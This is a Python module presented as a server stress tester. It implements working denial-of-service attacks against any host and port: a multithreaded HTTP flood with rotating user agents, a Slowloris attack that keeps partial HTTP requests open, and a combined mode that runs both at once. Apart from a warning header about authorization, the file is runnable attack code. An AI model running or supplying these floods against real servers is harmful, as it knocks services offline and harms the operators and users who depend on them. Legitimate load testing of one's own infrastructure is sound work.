#!/usr/bin/env python3
"""
Server Stress Tester Module
Multi-method stress testing for authorized server infrastructure testing

CRITICAL WARNING:
- This tool can take down servers
- Only use on YOUR OWN infrastructure
- Coordinate with network administrators
- Get explicit written authorization
- Use during maintenance windows
- Have backups ready

Unauthorized use is ILLEGAL and can result in criminal prosecution.
"""

import socket
import threading
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List
import random
from datetime import datetime

class StressTester:
    """
    Multi-method server stress testing toolkit
    """
    
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1',
    ]
    
    def __init__(self, target: str, port: int = 80):
        """
        Initialize stress tester
        
        Args:
            target: Target IP or hostname
            port: Target port (default 80)
        """
        self.target = target
        self.port = port
        self.running = False
        self.stats = {
            'requests_sent': 0,
            'requests_failed': 0,
            'connections_opened': 0,
            'start_time': None,
            'errors': []
        }
    
    def http_flood(self, threads: int = 100, duration: int = 60, method: str = 'GET'):
        """
        HTTP Flood attack - Overwhelm server with HTTP requests
        
        Args:
            threads: Number of concurrent threads
            duration: Test duration in seconds
            method: HTTP method (GET, POST)
        """
        self.running = True
        self.stats['start_time'] = time.time()
        
        print(f"[*] Starting HTTP Flood: {threads} threads, {duration}s duration")
        print(f"[*] Target: {self.target}:{self.port}")
        print(f"[*] Method: {method}")
        
        def flood_worker():
            """Worker thread for HTTP flooding"""
            url = f"http://{self.target}:{self.port}/"
            
            while self.running and (time.time() - self.stats['start_time']) < duration:
                try:
                    headers = {'User-Agent': random.choice(self.USER_AGENTS)}
                    
                    if method == 'GET':
                        response = requests.get(url, headers=headers, timeout=5)
                    else:
                        response = requests.post(url, headers=headers, timeout=5)
                    
                    self.stats['requests_sent'] += 1
                    
                    # Print status every 100 requests
                    if self.stats['requests_sent'] % 100 == 0:
                        elapsed = time.time() - self.stats['start_time']
                        rate = self.stats['requests_sent'] / elapsed
                        print(f"[+] Sent: {self.stats['requests_sent']} | Rate: {rate:.2f} req/s | Failed: {self.stats['requests_failed']}")
                
                except requests.exceptions.Timeout:
                    self.stats['requests_failed'] += 1
                except requests.exceptions.ConnectionError:
                    self.stats['requests_failed'] += 1
                    if not self.running:
                        print("[!] Target appears to be down!")
                except Exception as e:
                    self.stats['requests_failed'] += 1
                    if str(e) not in self.stats['errors']:
                        self.stats['errors'].append(str(e))
        
        # Launch threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(flood_worker)
        
        self.running = False
        return self.get_results()
    
    def slowloris(self, sockets: int = 200, duration: int = 300):
        """
        Slowloris attack - Exhaust server connections by keeping them open
        
        Args:
            sockets: Number of sockets to open
            duration: How long to keep connections alive (seconds)
        """
        self.running = True
        self.stats['start_time'] = time.time()
        socket_list = []
        
        print(f"[*] Starting Slowloris: {sockets} connections, {duration}s duration")
        print(f"[*] Target: {self.target}:{self.port}")
        
        # Create sockets
        for i in range(sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                
                # Send incomplete HTTP request
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
                s.send(f"User-Agent: {random.choice(self.USER_AGENTS)}\r\n".encode('utf-8'))
                s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
                
                socket_list.append(s)
                self.stats['connections_opened'] += 1
                
                if (i + 1) % 50 == 0:
                    print(f"[+] Opened {i + 1}/{sockets} connections")
            
            except socket.error as e:
                print(f"[!] Socket error: {e}")
                self.stats['requests_failed'] += 1
        
        print(f"[*] {len(socket_list)} connections established")
        print(f"[*] Keeping connections alive for {duration}s...")
        
        # Keep connections alive
        start = time.time()
        while (time.time() - start) < duration and self.running:
            for s in list(socket_list):
                try:
                    # Send partial header to keep connection alive
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                except socket.error:
                    socket_list.remove(s)
            
            # Show status every 10 seconds
            if int(time.time() - start) % 10 == 0:
                print(f"[*] Active connections: {len(socket_list)}/{sockets} | Elapsed: {int(time.time() - start)}s")
            
            time.sleep(10)
        
        # Close all sockets
        for s in socket_list:
            try:
                s.close()
            except:
                pass
        
        self.running = False
        print(f"[*] Test complete. Closed all connections.")
        return self.get_results()
    
    def combined_stress(self, http_threads: int = 50, slowloris_sockets: int = 100, duration: int = 120):
        """
        Combined attack - HTTP Flood + Slowloris simultaneously
        
        Args:
            http_threads: Threads for HTTP flood
            slowloris_sockets: Sockets for Slowloris
            duration: Test duration
        """
        print(f"[*] Starting Combined Stress Test")
        print(f"[*] HTTP Flood: {http_threads} threads")
        print(f"[*] Slowloris: {slowloris_sockets} sockets")
        print(f"[*] Duration: {duration}s")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Launch both attacks in parallel
        http_thread = threading.Thread(target=self.http_flood, args=(http_threads, duration))
        slowloris_thread = threading.Thread(target=self.slowloris, args=(slowloris_sockets, duration))
        
        http_thread.start()
        slowloris_thread.start()
        
        http_thread.join()
        slowloris_thread.join()
        
        return self.get_results()
    
    def stop(self):
        """Emergency stop"""
        print("\n[!] Stopping stress test...")
        self.running = False
    
    def get_results(self) -> Dict:
        """
        Get test results
        
        Returns:
            Statistics dictionary
        """
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        
        return {
            'target': f"{self.target}:{self.port}",
            'duration': elapsed,
            'requests_sent': self.stats['requests_sent'],
            'requests_failed': self.stats['requests_failed'],
            'success_rate': (self.stats['requests_sent'] - self.stats['requests_failed']) / max(self.stats['requests_sent'], 1) * 100,
            'requests_per_second': self.stats['requests_sent'] / max(elapsed, 1),
            'connections_opened': self.stats['connections_opened'],
            'errors': self.stats['errors'][:10]  # First 10 unique errors
        }


def stress_test(target: str, port: int = 80, method: str = 'http_flood', **kwargs) -> Dict:
    """
    Run stress test on target
    
    Args:
        target: Target IP/hostname
        port: Target port
        method: Test method ('http_flood', 'slowloris', 'combined')
        **kwargs: Additional parameters for specific methods
        
    Returns:
        Test results
    """
    tester = StressTester(target, port)
    
    try:
        if method == 'http_flood':
            return tester.http_flood(
                threads=kwargs.get('threads', 100),
                duration=kwargs.get('duration', 60)
            )
        elif method == 'slowloris':
            return tester.slowloris(
                sockets=kwargs.get('sockets', 200),
                duration=kwargs.get('duration', 300)
            )
        elif method == 'combined':
            return tester.combined_stress(
                http_threads=kwargs.get('http_threads', 50),
                slowloris_sockets=kwargs.get('slowloris_sockets', 100),
                duration=kwargs.get('duration', 120)
            )
        else:
            return {'error': 'Unknown method'}
    
    except KeyboardInterrupt:
        tester.stop()
        return tester.get_results()
